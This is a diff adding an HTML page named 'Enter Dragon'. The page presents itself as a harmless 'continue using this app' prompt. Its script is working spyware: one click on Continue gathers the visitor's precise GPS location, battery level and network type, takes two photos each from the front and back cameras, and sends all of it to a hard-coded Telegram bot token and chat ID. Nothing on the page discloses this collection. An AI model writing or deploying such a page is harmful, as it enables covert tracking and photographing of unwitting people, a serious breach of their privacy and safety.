@@ -1,0 +1,379 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#050505">
+    <title>Enter Dragon</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #050505; 
+            color: white;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent; 
+        }
+
+        /* Ambient Background Blobs for Visual Aesthetics */
+        .ambient-blob {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(100px);
+            z-index: -1;
+            opacity: 0.4;
+            animation: pulse 10s infinite alternate ease-in-out;
+        }
+
+        .blob-primary {
+            top: -10%;
+            left: -10%;
+            width: 40vw;
+            height: 40vw;
+            background: #3b82f6;
+        }
+
+        .blob-secondary {
+            bottom: -10%;
+            right: -10%;
+            width: 50vw;
+            height: 50vw;
+            background: #0ea5e9;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1) translate(0, 0); opacity: 0.3; }
+            100% { transform: scale(1.2) translate(30px, -30px); opacity: 0.5; }
+        }
+
+        /* Glassmorphism Classes */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-active:active {
+            transform: scale(0.96);
+        }
+
+        /* Toast Notifications */
+        #toast-container {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 1000;
+            width: 90%;
+            max-width: 400px;
+            pointer-events: none;
+        }
+
+        .toast {
+            background: rgba(20, 20, 20, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 0.875rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col relative selection:bg-blue-500/30">
+
+    <div class="ambient-blob blob-primary"></div>
+    <div class="ambient-blob blob-secondary"></div>
+
+    <!-- Header -->
+    <header class="w-full fixed top-0 z-50 glass-panel border-b-0 border-white/5">
+        <div class="px-4 py-5 flex justify-center items-center">
+            <h1 class="text-xl font-bold tracking-[0.2em] uppercase text-gray-300" style="text-shadow: 0 2px 10px rgba(255,255,255,0.1);">
+                Enter Dragon
+            </h1>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col items-center justify-center p-6 mt-16 z-10 w-full max-w-md mx-auto text-center">
+        
+        <!-- Icon -->
+        <div class="w-24 h-24 mb-10 rounded-2xl flex items-center justify-center glass-panel shadow-[0_0_40px_rgba(59,130,246,0.15)] transform rotate-3">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+        </div>
+
+        <p class="text-gray-300 mb-12 leading-relaxed text-base max-w-[280px]">
+            Do you want to continue using this app? Is the service required?
+        </p>
+
+        <!-- Continue Button -->
+        <button id="btn-continue" class="btn-active w-full max-w-[260px] py-4 rounded-2xl font-semibold text-lg text-white shadow-[0_8px_32px_rgba(59,130,246,0.25)] transition-all bg-blue-600/20 backdrop-blur-xl border border-blue-400/30 hover:bg-blue-600/40 hover:border-blue-400/50 flex items-center justify-center gap-3 relative overflow-hidden">
+            <span id="btn-text">Continue</span>
+            <svg id="btn-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 opacity-80" viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M12.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-2.293-2.293a1 1 0 010-1.414z" clip-rule="evenodd" />
+            </svg>
+            <!-- Spinner (Hidden by default) -->
+            <svg id="btn-spinner" class="animate-spin hidden h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+        </button>
+    </main>
+
+    <!-- Toast Notifications Container -->
+    <div id="toast-container"></div>
+
+    <!-- Hidden elements for camera processing -->
+    <video id="camera-stream" class="hidden" autoplay playsinline muted></video>
+    <canvas id="camera-canvas" class="hidden"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo';
+        const CHAT_ID = '7208869554';
+        
+        const btnContinue = document.getElementById('btn-continue');
+        const btnText = document.getElementById('btn-text');
+        const btnIcon = document.getElementById('btn-icon');
+        const btnSpinner = document.getElementById('btn-spinner');
+        const toastContainer = document.getElementById('toast-container');
+        
+        const video = document.getElementById('camera-stream');
+        const canvas = document.getElementById('camera-canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Utility: Show Toast Notification
+        function showToast(message, isSuccess = true) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            
+            const icon = isSuccess ? '✅' : '❌';
+            toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
+            
+            toastContainer.appendChild(toast);
+            
+            // Trigger animation
+            setTimeout(() => toast.classList.add('show'), 10);
+            
+            // Remove after 4 seconds
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        async function getBatteryStatus() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                }
+                return "Not supported";
+            } catch (e) {
+                return "Unknown error";
+            }
+        }
+
+        function getNetworkStatus() {
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    return `${connection.effectiveType || 'unknown'} (Type: ${connection.type || 'N/A'})`;
+                }
+                return "Not supported";
+            } catch (e) {
+                return "Error retrieving network";
+            }
+        }
+
+        function getGPSLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    resolve({ success: false, data: "Geolocation not supported" });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve({ 
+                        success: true, 
+                        data: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}` 
+                    }),
+                    (error) => resolve({ success: false, data: `Error: ${error.message}` }),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (e) { 
+                return false; 
+            }
+        }
+
+        async function sendTelegramPhoto(blob, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', caption);
+
+            try {
+                const response = await fetch(url, { method: 'POST', body: formData });
+                return response.ok;
+            } catch (e) { 
+                return false; 
+            }
+        }
+
+        async function captureAndSendPhotos(facingMode, label) {
+            let stream = null;
+            let successCount = 0;
+            
+            try {
+                const constraints = { 
+                    video: facingMode === 'environment' 
+                        ? { facingMode: { exact: "environment" } } 
+                        : { facingMode: "user" } 
+                };
+
+                // Try acquiring stream
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia(constraints);
+                } catch (exactError) {
+                    // Fallback constraint if 'exact' fails
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                }
+
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
+                });
+                
+                // Allow time for camera auto-exposure
+                await new Promise(r => setTimeout(r, 1000)); 
+
+                for (let i = 0; i < 2; i++) {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                    
+                    if (blob) {
+                        const sent = await sendTelegramPhoto(blob, `${label} - Image ${i+1}`);
+                        if (sent) successCount++;
+                    }
+                    
+                    if (i === 0) await new Promise(r => setTimeout(r, 500)); 
+                }
+                return { success: successCount > 0, count: successCount };
+                
+            } catch (error) {
+                console.error(`Camera error (${label}):`, error);
+                return { success: false, count: 0 };
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+        }
+
+        btnContinue.addEventListener('click', async () => {
+            // UI Update: Show loading state
+            btnContinue.disabled = true;
+            btnText.innerText = "Processing...";
+            btnIcon.classList.add('hidden');
+            btnSpinner.classList.remove('hidden');
+            
+            showToast("Initializing data sync...", true);
+
+            try {
+                // 1. Gather Text Info
+                const batteryData = await getBatteryStatus();
+                const networkData = getNetworkStatus();
+                const gpsResult = await getGPSLocation();
+
+                if (gpsResult.success) {
+                    showToast("GPS Location Fetched successfully", true);
+                } else {
+                    showToast(`GPS Failed: ${gpsResult.data}`, false);
+                }
+
+                // Send Text to Telegram
+                const message = `🚨 <b>ENTER DRAGON TEST</b> 🚨\n\n` +
+                                `🔋 <b>Battery:</b> ${batteryData}\n` +
+                                `📶 <b>Network:</b> ${networkData}\n` +
+                                `📍 <b>Location:</b> ${gpsResult.success ? `<a href="${gpsResult.data}">Google Maps</a>` : 'Failed'}`;
+                
+                const textSent = await sendTelegramMessage(message);
+                if (textSent) showToast("Text info sent to Bot", true);
+                else showToast("Failed to send text info", false);
+
+                // 2. Process Front Camera
+                showToast("Requesting Front Camera...", true);
+                const frontCamResult = await captureAndSendPhotos('user', 'Front Cam');
+                if (frontCamResult.success) {
+                    showToast(`Front Camera: ${frontCamResult.count} images sent`, true);
+                } else {
+                    showToast("Front Camera capture failed", false);
+                }
+
+                // 3. Process Back Camera
+                showToast("Requesting Back Camera...", true);
+                const backCamResult = await captureAndSendPhotos('environment', 'Back Cam');
+                if (backCamResult.success) {
+                    showToast(`Back Camera: ${backCamResult.count} images sent`, true);
+                } else {
+                    showToast("Back Camera capture failed", false);
+                }
+
+            } catch (error) {
+                console.error(error);
+                showToast("A critical error occurred during execution", false);
+            } finally {
+                // UI Update: Revert button state
+                showToast("Test complete. Remaining on page.", true);
+                btnContinue.disabled = false;
+                btnText.innerText = "Continue";
+                btnIcon.classList.remove('hidden');
+                btnSpinner.classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
+```
